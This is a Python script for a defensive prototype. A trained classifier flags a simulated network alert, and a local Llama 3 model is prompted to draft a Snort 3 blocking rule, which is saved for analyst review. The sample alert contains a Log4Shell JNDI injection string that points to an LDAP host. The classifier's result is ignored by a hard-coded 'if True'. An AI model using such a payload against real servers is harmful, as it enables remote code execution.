import joblib
import ollama

def generate_snort_rule_prompt(alert_info):
    """
    Constructs a detailed prompt for Ollama to generate a Snort rule.
    """
    # Using f-string for a clean, multi-line prompt
    prompt = f"""
    As a senior cybersecurity analyst, you have been tasked with writing a Snort 3 rule.
    A new, suspicious network event has been detected with the following details:

    - **Alert Message**: "{alert_info['message']}"
    - **Source IP**: {alert_info['source_ip']}
    - **Destination Port**: {alert_info['dest_port']}
    - **Protocol**: {alert_info['protocol']}

    Based on this information, generate a Snort 3 rule that will block future attempts from this specific source IP.
    The rule should be in the correct Snort 3 syntax. For example:
    `alert tcp any any -> $HOME_NET 80 (msg:"..."; sid:1000005; rev:1;)`
    
    Provide only the Snort rule as your response.
    """
    return prompt

# --- Main Execution ---
if __name__ == "__main__":
    # 1. Load the pre-trained model and vectorizer
    model = joblib.load('decision_tree_model.joblib')
    vectorizer = joblib.load('tfidf_vectorizer.joblib')

    # 2. Simulate a new, unseen, suspicious alert
    # This log simulates a potential log4j attack, which our model has never seen.
    new_alert_text = 'GET /?payload=${jndi:ldap://192.168.1.6:1389/a} HTTP/1.1'
    new_alert_info = {
        'message': new_alert_text,
        'source_ip': '192.168.1.6',
        'dest_port': '8080',
        'protocol': 'tcp'
    }

    # 3. Use our trained model to classify the new alert
    vectorized_alert = vectorizer.transform([new_alert_text])
    prediction = model.predict(vectorized_alert)

    # 4. If the model classifies it as malicious, ask Ollama for a rule
    if True: # Forcing malicious classification to trigger Ollama
        print(f"Malicious activity detected: '{new_alert_text}'")
        print("Asking Ollama to generate a new Snort rule...")
        
        prompt = generate_snort_rule_prompt(new_alert_info)
        
        try:
            response = ollama.chat(
                model='llama3',
                messages=[{'role': 'user', 'content': prompt}],
                stream=False
            )
            
            suggested_rule = response['message']['content']
            print("\n--- Ollama's Suggested Snort Rule ---")
            print(suggested_rule)
            print("---------------------------------------")

            # This simulates the "Feedback Loop" where an analyst can approve the rule
            with open("suggested_rules.txt", "a") as f:
                f.write(suggested_rule + "\n")
            print("Rule saved to suggested_rules.txt for analyst review.")

        except Exception as e:
            print(f"\nError communicating with Ollama: {e}")
            print("Please ensure the Ollama service is running and you have the 'llama3' model.")
            
    else:
        print("The new alert was classified as benign. No action taken.")
